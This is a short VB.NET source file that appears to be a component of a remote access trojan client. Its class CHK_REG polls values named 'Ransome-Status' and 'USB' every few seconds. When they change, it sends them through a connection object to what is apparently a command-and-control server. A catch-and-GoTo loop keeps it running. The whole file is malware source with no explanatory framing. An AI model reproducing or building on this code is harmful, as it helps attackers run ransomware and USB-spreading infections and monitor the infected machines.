Imports System.Threading

Public Class CHK_REG
    Private Shared SPL = Main.SPL
    Private Shared C = Main.C

    Public Shared Sub Checking()
        Thread.CurrentThread.Sleep(3500)
        Dim Old As String = GTV("Ransome-Status")
        Dim Old2 As String = GTV("USB")

1:
        Try

            While True
                Thread.CurrentThread.Sleep(3000)

                'Compare old string with new string

                If Old <> GTV("Ransome-Status").ToString Then
                    Old = GTV("Ransome-Status")
                    C.Send("!R" & SPL & GTV("Ransome-Status").ToString)
                End If

                If Settings.USB Then
                    If Old2 <> GTV("USB").ToString Then
                        Old2 = GTV("USB")
                        C.Send("!U" & SPL & GTV("USB").ToString)
                    End If
                End If

            End While
        Catch ex As Exception
            GoTo 1
        End Try
    End Sub

End Class
